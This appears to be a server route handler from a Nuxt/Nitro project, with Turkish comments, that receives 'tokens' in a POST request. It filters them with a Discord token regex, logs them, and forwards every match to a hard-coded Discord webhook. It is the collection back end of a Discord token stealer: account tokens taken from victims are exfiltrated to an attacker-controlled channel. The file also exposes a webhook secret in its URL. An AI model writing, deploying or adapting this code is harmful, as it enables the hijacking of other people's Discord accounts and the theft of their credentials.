export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const tokens = body.tokens || []
  
  // Discord token regex validasyonu
  const tokenRegex = /(mfa\.[\w-]{84})|([\w-]{23,28}\.[\w-]{6}\.[\w-]{27,38})/g;

  // Her bir token için detaylı log
  tokens.forEach(token => {
    // Token validasyonu
    if (!token || typeof token !== 'string' || !token.match(tokenRegex)) {
      return;
    }

    console.log('Token:', token)
    console.log('-------------------')
    $fetch("https://discord.com/api/webhooks/1366052815759474709/F-drv0MjgxHuH4q90oVwMtJYJWJwti2gmopcU9xaQMEF5Wp63nC8P0z7hPCzbgtCfxaU", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\`\`\`${token}\`\`\``
      })
    }).catch(err => console.log(err))
  })
  
  return { success: true }
}) 